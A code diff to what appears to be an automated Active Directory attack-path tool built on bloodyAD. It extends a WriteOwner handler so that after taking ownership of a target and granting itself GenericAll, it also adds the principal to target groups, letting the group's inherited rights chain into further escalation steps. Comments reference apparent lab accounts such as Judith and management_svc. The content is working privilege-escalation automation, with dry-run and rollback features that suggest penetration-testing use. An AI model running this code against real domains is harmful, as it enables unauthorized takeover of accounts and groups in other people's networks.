@@ -243,8 +243,12 @@ class WriteDaclHandler(BaseEdgeHandler):
 class WriteOwnerHandler(BaseEdgeHandler):
     """Handles WriteOwner edges.
 
-    Takes ownership of the target object, then modifies the DACL to grant
-    GenericAll (since the owner can always modify the DACL).
+    Takes ownership of the target object and modifies the DACL to grant
+    GenericAll (since the owner can always modify the DACL).  When the
+    target is a Group, *also* adds the principal as a member so that the
+    group's outbound ACL edges (GenericWrite on users, GenericAll on
+    computers, etc.) flow to the principal via MemberOf for subsequent
+    chained steps in the attack path.
     """
 
     async def check_prerequisites(self, edge: EdgeInfo) -> tuple[bool, str]:
@@ -265,12 +269,16 @@ class WriteOwnerHandler(BaseEdgeHandler):
             else:
                 return False, f"Could not resolve DN for {edge.target.name} via LDAP", []
 
+        target_is_group = edge.target.label.lower() == "group"
+
         if dry_run:
-            return (
-                True,
-                f"[DRY RUN] Would take ownership of {target} and grant GenericAll to {principal}",
-                [],
+            action_desc = (
+                f"[DRY RUN] Would take ownership of {target}, grant GenericAll to "
+                f"{principal}, and add {principal} as a member of {target}"
+                if target_is_group
+                else f"[DRY RUN] Would take ownership of {target} and grant GenericAll to {principal}"
             )
+            return True, action_desc, []
 
         # Step 1: Take ownership
         self.logger.info("Taking ownership of %s as %s", target, principal)
@@ -290,13 +298,71 @@ class WriteOwnerHandler(BaseEdgeHandler):
                 [],
             )
 
+        # Step 3 (Group targets only): add principal as member so that the
+        # group's outbound ACL edges propagate through MemberOf in subsequent
+        # chained steps.  Without this, Judith owns MANAGEMENT but isn't a
+        # member, so MANAGEMENT's GenericWrite on management_svc is never
+        # reachable when authenticating as Judith.
+        if target_is_group:
+            self.logger.info(
+                "Adding %s as member of %s so group-inherited rights propagate",
+                principal, target,
+            )
+            result = await bloody.add_to_group(
+                self.config, auth_args, principal, target,
+            )
+            if not result["success"]:
+                # Don't fail the whole step — ownership + GenericAll still
+                # useful on their own, and the user can add themselves
+                # manually.  Just flag it in the result message.
+                self.logger.warning(
+                    "Failed to add %s to %s after taking ownership: %s",
+                    principal, target, result.get("error", "unknown"),
+                )
+                return (
+                    True,
+                    (
+                        f"Took ownership of {target} and granted GenericAll to "
+                        f"{principal}; could NOT add as member — subsequent "
+                        f"chained steps via this group may fail: "
+                        f"{result.get('error', 'unknown')}"
+                    ),
+                    [],
+                )
+            return (
+                True,
+                (
+                    f"Took ownership of {target}, granted GenericAll, and added "
+                    f"{principal} as member (group rights now propagate)"
+                ),
+                [],
+            )
+
         return True, f"Took ownership of {target} and granted GenericAll to {principal}", []
 
     def get_rollback_action(self, edge: EdgeInfo) -> RollbackAction | None:
         principal = self._resolve_principal(edge)
         target = self._resolve_target(edge)
-        # Ownership changes are difficult to reverse without knowing the
-        # original owner.  We record the DACL cleanup at minimum.
+        target_is_group = edge.target.label.lower() == "group"
+
+        if target_is_group:
+            return RollbackAction(
+                step_index=0,
+                action_type="remove_dacl_ace_and_group_member",
+                description=(
+                    f"Remove {principal} from group {target} and remove "
+                    f"GenericAll ACE (note: original owner NOT restored)"
+                ),
+                command=(
+                    f"bloodyAD remove groupMember {target} {principal}; "
+                    f"bloodyAD remove dacl {target} {principal} GenericAll"
+                ),
+                reversible=True,
+            )
+
+        # Ownership changes on non-group targets are difficult to reverse
+        # without knowing the original owner.  We record the DACL cleanup
+        # at minimum.
         return RollbackAction(
             step_index=0,
             action_type="remove_dacl_ace",
